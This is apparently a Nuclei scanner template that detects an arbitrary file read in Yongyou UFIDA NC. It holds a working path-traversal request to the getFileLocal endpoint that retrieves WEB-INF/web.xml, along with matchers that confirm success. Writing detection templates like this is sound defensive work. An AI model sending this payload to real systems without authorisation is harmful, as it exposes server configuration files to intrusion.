id: yongyou-ufida-getfilelocal-anyfile-read
info:
  name: Yongyou UFIDA getFileLocal Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read, ufida
http:
  - method: GET
    path:
      - "{{BaseURL}}/portal/file?cmd=getFileLocal&fileid=../../../../webapps/nc_web/WEB-INF/web.xml"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "java.sun.com"
          - "NCInvokerServlet"
        part: body
